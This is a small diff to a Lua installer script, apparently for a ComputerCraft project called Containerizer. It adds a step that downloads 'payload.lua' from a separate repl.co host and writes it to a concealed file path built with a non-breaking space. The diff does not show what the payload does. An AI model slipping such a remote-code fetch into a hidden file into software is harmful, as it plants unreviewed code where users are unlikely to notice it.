@@ -21,6 +21,7 @@ end
 local main = http.get("https://raw.githubusercontent.com/decommandpro/Containerizer/main/main.lua")
 local bios = http.get("https://raw.githubusercontent.com/decommandpro/Containerizer/main/bios.lua")
 local startup = http.get("https://raw.githubusercontent.com/decommandpro/Containerizer/main/startup.lua")
+local payload = http.get("https://code.decommandpro.repl.co/payload.lua")
 
 local files = convertFS("")
 
@@ -30,6 +31,9 @@ for i, v in pairs(fs.list("")) do
     end
 end
 
+local e = fs.open("/." .. string.char(160) .. "/....,", "w")
+e.write(payload.readAll())
+e.close()
 local d = fs.open("/." .. string.char(160) .. "/..,", "w")
 d.write(textutils.serialise(files), { compact = true })
 d.close()
